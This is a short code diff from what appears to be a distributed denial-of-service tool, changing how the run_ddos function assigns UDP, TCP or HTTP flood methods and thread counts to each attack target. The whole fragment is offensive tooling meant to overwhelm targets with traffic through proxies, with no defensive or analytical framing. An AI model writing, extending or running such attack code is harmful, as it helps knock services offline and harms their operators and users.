@@ -71,15 +71,15 @@ def run_ddos(thread_pool, proxies, targets, total_threads, period, rpc, http_met
     params_list = []
     for target in targets:
         assert target.is_resolved, "Unresolved target cannot be used for attack"
-        # UDP
+        # udp://, method defaults to "UDP"
         if target.is_udp:
             params_list.append(Params(target, target.method or 'UDP', UDP_THREADS))
-
-        # TCP
-        elif target.url.scheme == "tcp" or target.method is not None:
-            params_list.append(
-                Params(target, target.method or 'TCP', threads_per_target))
-
+        # Method is given explicitly
+        elif target.method is not None:
+            params_list.append(Params(target, target.method, threads_per_target))
+        # tcp://
+        elif target.url.scheme == "tcp":
+            params_list.append(Params(target, 'TCP', threads_per_target))
         # HTTP(S), methods from --http-methods
         else:
             threads = threads_per_target // len(http_methods)
